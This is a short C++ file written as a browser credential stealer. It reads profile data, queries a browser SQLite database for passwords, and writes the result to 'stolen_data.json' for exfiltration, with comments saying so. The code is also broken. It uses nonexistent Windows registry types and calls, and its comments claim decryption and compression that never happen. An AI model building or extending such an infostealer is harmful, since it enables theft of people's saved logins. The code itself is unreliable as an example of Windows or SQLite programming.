#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>

#include <SQLiteCpp/SQLiteCpp.h>

std::string readDataFromTextFile(const std::string& fileName) {
    std::ifstream file(fileName);
    if (!file.is_open()) {
        throw std::runtime_error("Could not open input file");
    }

    std::string data;
    while (file >> data) {
        // Read until end of file
    }
    
    return data;
}

void writeDataToRegistry(const std::string& data) {
    HKEY_ROOT hkey = RegOpenCurrentUser();
    if (hkey == HKEY_INVALID) {
        throw std::runtime_error("Could not open registry key");
    }

    const auto ret = RegSetValueEx(
        hkey,
        "Software\\MyApp",
        0,
        REG_SZ,
        data.c_str(),
        data.size()
    );

    if (ret != ERROR_SUCCESS) {
        throw std::runtime_error("Could not write to registry");
    }

    RegCloseKey(hkey);
}

int main() {
    try {
        // Read browser profile folders data
        std::string userProfileData = readDataFromTextFile("user_profile_data.txt");

        // Open SQLite database and get login credentials
        SQLite::Database db("browser_database.db");
        SQLite::Statement query(db, "SELECT password FROM user_table WHERE id=1");
        query.get(0) >> userProfileData;  // Decrypt passwords using local master key

        // Compress all stolen data into a JSON file for exfiltration
        std::ofstream outfile("stolen_data.json");
        outfile << userProfileData;
    } catch (const std::exception& e) {
        writeDataToRegistry(e.what());
    }

    return 0;
}
